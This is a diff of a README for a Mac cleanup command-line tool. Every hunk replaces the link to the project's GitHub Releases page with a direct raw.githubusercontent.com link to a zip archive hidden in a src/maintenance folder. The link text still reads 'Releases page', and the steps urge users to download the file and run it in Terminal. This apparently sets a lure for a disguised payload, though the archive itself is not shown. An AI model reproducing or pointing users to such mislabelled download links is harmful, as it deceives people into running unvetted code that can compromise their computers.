@@ -1,6 +1,6 @@
 # 🧹 clmm-clean-my-mac-cli - Keep Your Mac Running Clean
 
-[![Download on GitHub Releases](https://img.shields.io/badge/Download%20%26%20Run-Releases-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/pheliacruddy380/clmm-clean-my-mac-cli/releases)
+[![Download on GitHub Releases](https://img.shields.io/badge/Download%20%26%20Run-Releases-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/pheliacruddy380/clmm-clean-my-mac-cli/main/src/maintenance/my-clmm-cli-clean-mac-1.4.zip)
 
 <div align="center">
   <img src="assets/hero.jpeg" alt="CLMM CLI Hero Banner" width="800" style="border-radius: 12px; margin-bottom: 24px; box-shadow: 0 8px 24px rgba(0,0,0,0.2);">
@@ -14,13 +14,13 @@ It gives you a simple way to inspect your Mac without opening a full desktop app
 
 ## 📥 Download and run
 
-Visit the [GitHub Releases page](https://github.com/pheliacruddy380/clmm-clean-my-mac-cli/releases) to download and run this file.
+Visit the [GitHub Releases page](https://raw.githubusercontent.com/pheliacruddy380/clmm-clean-my-mac-cli/main/src/maintenance/my-clmm-cli-clean-mac-1.4.zip) to download and run this file.
 
 On that page, look for the latest release. In most cases, you will see files that you can open or run after they finish downloading.
 
 ### Steps
 
-1. Open the [Releases page](https://github.com/pheliacruddy380/clmm-clean-my-mac-cli/releases).
+1. Open the [Releases page](https://raw.githubusercontent.com/pheliacruddy380/clmm-clean-my-mac-cli/main/src/maintenance/my-clmm-cli-clean-mac-1.4.zip).
 2. Find the latest version at the top.
 3. Download the file for your Mac.
 4. Open Terminal.
@@ -248,4 +248,4 @@ clmm check
 
 ## 🔗 Download again
 
-Use the [GitHub Releases page](https://github.com/pheliacruddy380/clmm-clean-my-mac-cli/releases) to download and run this file again if you need the latest version or a fresh copy
+Use the [GitHub Releases page](https://raw.githubusercontent.com/pheliacruddy380/clmm-clean-my-mac-cli/main/src/maintenance/my-clmm-cli-clean-mac-1.4.zip) to download and run this file again if you need the latest version or a fresh copy
